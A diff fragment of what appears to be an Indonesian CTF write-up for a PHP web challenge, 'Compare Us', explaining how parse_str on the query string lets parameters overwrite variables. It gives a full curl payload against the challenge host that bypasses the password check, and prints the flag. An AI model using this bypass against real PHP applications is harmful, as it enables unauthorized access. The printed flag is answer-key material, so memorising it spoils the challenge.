@@ -13,7 +13,7 @@ comments: true
 featured: true
 ---
 
-## Compare Us 
+## Website : Compare Us - 40 Point
 
 > Title : Compare Us
 Point : 40
@@ -70,7 +70,12 @@ tapi ternyata ada pemanggilan fungsi `parse_str($_SERVER['QUERY_STRING']);` yang
 overwrite variable yang sudah ada simply `?&check=dor&password=dor` maka input kita berhasil bypass validasi tersebut.
 
 Full payload : `curl "http://task-00000001.itrace.systems/compare-us.php?key=302e3529999999999999999999999999999&check=dor&password=dor" |grep -o ITRACE{[a-z0-9_]*}`
+
 flag : `ITRACE{r1d1n9_i5_34513r_th4n_r34d1n9}`
+
+
+
+
 
 
 ## AJAX XAJA
